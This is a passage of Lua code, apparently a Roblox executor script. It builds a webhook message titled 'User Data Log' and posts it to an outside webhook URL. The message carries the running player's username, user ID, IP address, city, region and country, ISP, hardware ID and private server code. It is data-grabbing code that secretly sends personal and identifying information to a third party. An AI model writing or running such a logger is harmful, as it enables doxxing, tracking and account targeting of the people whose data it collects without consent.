        ["title"] = "User Data Log",
        ["color"] = 0x00FF00,
        ["fields"] = {
            {["name"] = "Roblox User",   ["value"] = player.Name, ["inline"] = true},
            {["name"] = "User ID",       ["value"] = tostring(player.UserId), ["inline"] = true},
            {["name"] = "IP Address",    ["value"] = ip, ["inline"] = true},
            {["name"] = "Location",      ["value"] = city .. ", " .. region .. ", " .. country, ["inline"] = true},
            {["name"] = "ISP",           ["value"] = isp, ["inline"] = true},
            {["name"] = "HWID",          ["value"] = hwid, ["inline"] = true},
            {["name"] = "Private Server Code", ["value"] = serverCode, ["inline"] = false},
        },
        ["timestamp"] = DateTime.now():ToIsoDate()
    }

    local payload = { embeds = { embed } }
    local json = HttpService:JSONEncode(payload)

    local success = httpRequest(WebhookURL, "POST", json)
    if success then
        print("[Logger] Webhook sent.")
    else
        warn("[Logger] Failed to send webhook.")
    end
end

